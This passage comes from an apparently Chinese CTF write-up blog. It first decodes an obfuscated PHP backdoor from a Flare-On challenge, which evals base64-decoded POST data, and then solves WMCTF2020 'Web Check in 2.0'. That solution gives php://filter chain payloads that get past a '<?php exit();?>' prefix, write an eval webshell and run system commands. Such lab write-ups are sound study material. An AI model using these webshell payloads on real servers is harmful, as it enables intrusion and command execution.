<span class="hljs-number">30</span>, <span class="hljs-number">11</span>, <span class="hljs-number">24</span>, <span class="hljs-number">7</span>, <span class="hljs-number">63</span>, <span class="hljs-number">45</span>, <span class="hljs-number">20</span>, <span class="hljs-number">23</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">42</span>, <span class="hljs-number">24</span>, <span class="hljs-number">60</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">18</span>, <span class="hljs-number">58</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">18</span>, <span class="hljs-number">58</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">83</span>, <span class="hljs-number">43</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">38</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">17</span>, <span class="hljs-number">37</span>, <span class="hljs-number">63</span>, <span class="hljs-number">58</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">83</span>, <span class="hljs-number">43</span>, <span class="hljs-number">87</span>, <span class="hljs-number">42</span>, <span class="hljs-number">24</span>, <span class="hljs-number">60</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">87</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">17</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">45</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">11</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">70</span>, <span class="hljs-number">63</span>, <span class="hljs-number">7</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">81</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">12</span>, <span class="hljs-number">63</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">83</span>, <span class="hljs-number">63</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">87</span>, <span class="hljs-number">23</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">75</span>, <span class="hljs-number">49</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">49</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">18</span>, <span class="hljs-number">50</span>, <span class="hljs-number">87</span>, <span class="hljs-number">42</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">81</span>, <span class="hljs-number">40</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">11</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">70</span>, <span class="hljs-number">63</span>, <span class="hljs-number">7</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">81</span>, <span class="hljs-number">7</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">40</span>, <span class="hljs-number">63</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">24</span>, <span class="hljs-number">63</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">17</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">17</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">40</span>, <span class="hljs-number">42</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">49</span>, <span class="hljs-number">42</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">70</span>, <span class="hljs-number">42</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">1</span>, <span class="hljs-number">17</span>, <span class="hljs-number">80</span>, <span class="hljs-number">58</span>, <span class="hljs-number">66</span>, <span class="hljs-number">3</span>, <span class="hljs-number">86</span>, <span class="hljs-number">27</span>, <span class="hljs-number">88</span>, <span class="hljs-number">77</span>, <span class="hljs-number">80</span>, <span class="hljs-number">38</span>, <span class="hljs-number">25</span>, <span class="hljs-number">40</span>, <span class="hljs-number">81</span>, <span class="hljs-number">20</span>, <span class="hljs-number">5</span>, <span class="hljs-number">76</span>, <span class="hljs-number">81</span>, <span class="hljs-number">15</span>, <span class="hljs-number">50</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">24</span>, <span class="hljs-number">81</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">40</span>, <span class="hljs-number">90</span>, <span class="hljs-number">58</span>, <span class="hljs-number">81</span>, <span class="hljs-number">40</span>, <span class="hljs-number">30</span>, <span class="hljs-number">75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">27</span>, <span class="hljs-number">19</span>, <span class="hljs-number">75</span>, <span class="hljs-number">28</span>, <span class="hljs-number">7</span>, <span class="hljs-number">88</span>, <span class="hljs-number">32</span>, <span class="hljs-number">45</span>, <span class="hljs-number">7</span>, <span class="hljs-number">90</span>, <span class="hljs-number">52</span>, <span class="hljs-number">80</span>, <span class="hljs-number">58</span>, <span class="hljs-number">5</span>, <span class="hljs-number">70</span>, <span class="hljs-number">63</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">66</span>, <span class="hljs-number">42</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">0</span>, <span class="hljs-number">12</span>, <span class="hljs-number">50</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">83</span>, <span class="hljs-number">43</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">38</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">7</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">72</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">0</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">11</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">87</span>, <span class="hljs-number">70</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">7</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">18</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">42</span>, <span class="hljs-number">24</span>, <span class="hljs-number">60</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">17</span>, <span class="hljs-number">91</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">75</span>, <span class="hljs-number">49</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">45</span>, <span class="hljs-number">12</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">90</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">81</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">49</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">40</span>, <span class="hljs-number">63</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">18</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">1</span>, <span class="hljs-number">18</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">0</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">90</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">72</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">40</span>, <span class="hljs-number">63</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">24</span>, <span class="hljs-number">63</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">17</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">90</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">38</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">75</span>, <span class="hljs-number">70</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">90</span>, <span class="hljs-number">58</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">75</span>, <span class="hljs-number">11</span>, <span class="hljs-number">79</span>, <span class="hljs-number">28</span>, <span class="hljs-number">27</span>, <span class="hljs-number">75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">42</span>, <span class="hljs-number">23</span>, <span class="hljs-number">88</span>, <span class="hljs-number">30</span>, <span class="hljs-number">35</span>, <span class="hljs-number">47</span>, <span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">73</span>, <span class="hljs-number">35</span>, <span class="hljs-number">68</span>, <span class="hljs-number">38</span>, <span class="hljs-number">63</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">38</span>, <span class="hljs-number">45</span>, <span class="hljs-number">30</span>, <span class="hljs-number">81</span>, <span class="hljs-number">15</span>, <span class="hljs-number">50</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">24</span>, <span class="hljs-number">81</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">40</span>, <span class="hljs-number">90</span>, <span class="hljs-number">58</span>, <span class="hljs-number">81</span>, <span class="hljs-number">40</span>, <span class="hljs-number">30</span>, <span class="hljs-number">75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">27</span>, <span class="hljs-number">19</span>, <span class="hljs-number">75</span>, <span class="hljs-number">28</span>, <span class="hljs-number">23</span>, <span class="hljs-number">75</span>, <span class="hljs-number">77</span>, <span class="hljs-number">1</span>, <span class="hljs-number">28</span>, <span class="hljs-number">1</span>, <span class="hljs-number">43</span>, <span class="hljs-number">52</span>, <span class="hljs-number">31</span>, <span class="hljs-number">19</span>, <span class="hljs-number">75</span>, <span class="hljs-number">81</span>, <span class="hljs-number">40</span>, <span class="hljs-number">30</span>, <span class="hljs-number">75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">27</span>, <span class="hljs-number">75</span>, <span class="hljs-number">77</span>, <span class="hljs-number">35</span>, <span class="hljs-number">47</span>, <span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">73</span>, <span class="hljs-number">21</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">51</span>, <span class="hljs-number">40</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">77</span>, <span class="hljs-number">49</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">70</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">49</span>, <span class="hljs-number">51</span>, <span class="hljs-number">4</span>, <span class="hljs-number">51</span>, <span class="hljs-number">91</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">70</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">91</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">51</span>, <span class="hljs-number">70</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">49</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">51</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">91</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">51</span>, <span class="hljs-number">70</span>, <span class="hljs-number">21</span>, <span class="hljs-number">47</span>, <span class="hljs-number">93</span>, <span class="hljs-number">8</span>, <span class="hljs-number">10</span>, <span class="hljs-number">58</span>, <span class="hljs-number">82</span>, <span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">82</span>, <span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">29</span>, <span class="hljs-number">29</span>, <span class="hljs-number">47</span>);<br><span class="hljs-variable">$do_me</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$order</span>);<span class="hljs-variable">$i</span>++)<br>&#123;<br>    <span class="hljs-variable">$do_me</span>=<span class="hljs-variable">$do_me</span>.<span class="hljs-variable">$terms</span>[<span class="hljs-variable">$order</span>[<span class="hljs-variable">$i</span>]];<br>&#125;<br><span class="hljs-comment">#   echo($do_me);</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$do_me</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>回显一下do_me。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_</span>= \<span class="hljs-string">&#x27;aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9\&#x27;;</span><br><span class="hljs-string">$__=\&#x27;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7\&#x27;;</span><br><span class="hljs-string">$___=&quot;\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65&quot;;</span><br><span class="hljs-string">eval($___($__));</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>base64解码一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;\x61\x31\x31\x44\x4F\x54\x74\x68\x61\x74\x44\x4F\x54\x6A\x61\x76\x61\x35\x63\x72\x61\x70\x41\84\x66\x6C\x61\x72\x65\x44\65\x53\72\111\110\x44\79\84\99\x6F\x6D&quot;</span>]))<br>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D&quot;</span>]));<br>&#125;<br><span class="hljs-variable">$code</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_</span>);<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br></code></pre></td></tr></table></figure><p>这里就没有去写脚本了。\ 后面跟十进制数，\x 后面跟十六进制数。网站直接16进制转字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 16进制">\x61\x31\x31\x44\x4F\x54\x74\x68\x61\x74\x44\x4F\x54\x6A\x61\x76\x61\x35\x63\x72\x61\x70\x41\x54\x66\x6C\x61\x72\x65\x44\x41\x53\x48\x6f\x6e\x44\x4f\x54\x63\x6F\x6D<br><br>a11DOTthatDOTjava5crapATflareDASHonDOTcom<br></code></pre></td></tr></table></figure><p>后续是看了wp的。</p><p><strong>按照 flareon 比赛 flag 的尿性，DOT 要换成 .，AT 换成 @，DASH 换成 -，得到最终的 flag</strong><br>最终<a href="mailto:&#x61;&#x31;&#x31;&#x2e;&#116;&#x68;&#97;&#x74;&#x2e;&#106;&#x61;&#x76;&#x61;&#53;&#x63;&#x72;&#97;&#x70;&#x40;&#x66;&#x6c;&#x61;&#114;&#101;&#x2d;&#x6f;&#x6e;&#46;&#x63;&#x6f;&#109;">&#x61;&#x31;&#x31;&#x2e;&#116;&#x68;&#97;&#x74;&#x2e;&#106;&#x61;&#x76;&#x61;&#53;&#x63;&#x72;&#97;&#x70;&#x40;&#x66;&#x6c;&#x61;&#114;&#101;&#x2d;&#x6f;&#x6e;&#46;&#x63;&#x6f;&#109;</a>。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220218183842.png"></p><h2 id="WMCTF2020-Web-Check-in-2-0"><a href="#WMCTF2020-Web-Check-in-2-0" class="headerlink" title="[WMCTF2020]Web Check in 2.0"></a>[WMCTF2020]Web Check in 2.0</h2><p>进去一看代码 感觉读懂了。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220215113647.png" alt="QQ截图20220215113647"></p><p>洋洋得意直接构造链接—&gt;<a href="http://48571e46-9b1c-4cf3-9889-cfbef23ea393.node4.buuoj.cn:81/?content=flag.php">http://48571e46-9b1c-4cf3-9889-cfbef23ea393.node4.buuoj.cn:81/?content=flag.php</a><br>很打脸。<br>然后再仔细读了读。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">exit</span>();&gt;<br></code></pre></td></tr></table></figure><p>这不是直接就退出了嘛。网上翻阅很久资料后续看到p神的文章。<br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><h3 id="绕过-lt-php-exit-gt"><a href="#绕过-lt-php-exit-gt" class="headerlink" title="绕过&lt;?php exit();&gt;"></a>绕过&lt;?php exit();&gt;</h3><p><a href="https://bbs.pediy.com/thread-271283.htm%E8%BF%99%E6%98%AFh3%E5%B8%88%E5%82%85%E7%9A%84%E6%96%87%E7%AB%A0%EF%BC%8C%E5%BB%BA%E8%AE%AE%E8%AF%A6%E8%AF%BB%E3%80%82">https://bbs.pediy.com/thread-271283.htm这是h3师傅的文章，建议详读。</a></p><h3 id="巧用base64编码"><a href="#巧用base64编码" class="headerlink" title="巧用base64编码"></a>巧用base64编码</h3><p>p神文章讲的很清楚。<br>自己不很清楚点的。</p><ul><li>&#96;&#96;&#96;php<br>$content .&#x3D; $_POST[‘txt’];  #这里的点是连接的意思，哈哈哈小白非常菜 仔细读p神的文章及他的图片+半猜半蒙<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- base64解码方式：“phpexit”一共<span class="hljs-number">7</span>个字符，因为base64算法解码时是<span class="hljs-number">4</span>个byte一组，所以给他增加<span class="hljs-number">1</span>个“a”一共<span class="hljs-number">8</span>个字符。这样，<span class="hljs-string">&quot;phpexita&quot;</span>被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是`<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">exit</span>; <span class="hljs-meta">?&gt;</span>`没有了。<br><br>- ```php<br>  <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>])<br>  <span class="hljs-comment">#匹配字符 替换成的字符 替换目标</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="巧用字符串操作"><a href="#巧用字符串操作" class="headerlink" title="巧用字符串操作"></a>巧用字符串操作</h3><ul><li><pre><code class="php">&lt;?php exit; ?&gt; # 实际上是一个XML标签<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>- ```php<br>  strip_tags() # — 从字符串中去除 HTML 和 PHP 标记<br></code></pre></td></tr></table></figure></code></pre></li><li><p>php:&#x2F;&#x2F;filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p></li><li><p>除此之外，我们还可以利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了。</p></li></ul><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><h3 id="require-once"><a href="#require-once" class="headerlink" title="require_once"></a>require_once</h3><p>rot3加密：<a href="http://www.hiencode.com/rot13.html">http://www.hiencode.com/rot13.html</a><br>require_once:<a href="https://www.php.net/manual/zh/function.require-once.php">https://www.php.net/manual/zh/function.require-once.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span>   <span class="hljs-comment">#rot3编码</span><br>cuc @<span class="hljs-title function_ invoke__">riny</span>(<span class="hljs-variable">$_cbfg</span>[<span class="hljs-string">&#x27;pzq&#x27;</span>]);<br><br>php:<span class="hljs-comment">//filter/write=string.%7%32ot13|cuc @riny($_cbfg[&#x27;pzq&#x27;]);|/resource=shell.php </span><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220215144143.png" alt="QQ截图20220215144143"></p><p>这里就导致不能直接写入一句话木马，导致每次都要重写文件。(来自<strong>H3h3QAQ</strong>)师傅的解答。</p><h3 id="过滤器绕过"><a href="#过滤器绕过" class="headerlink" title="过滤器绕过"></a>过滤器绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">?<br>content=php:<span class="hljs-comment">//filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=h3.php</span><br><br>?content=h3.php&amp;<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);  <br><br>?content=php:<span class="hljs-comment">//filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=h3.php</span><br><br>?content=h3.php&amp;<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>); <br><br></code></pre></td></tr></table></figure><p>这里直接采用h3师傅的绕过。哈哈哈。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220215145358.png" 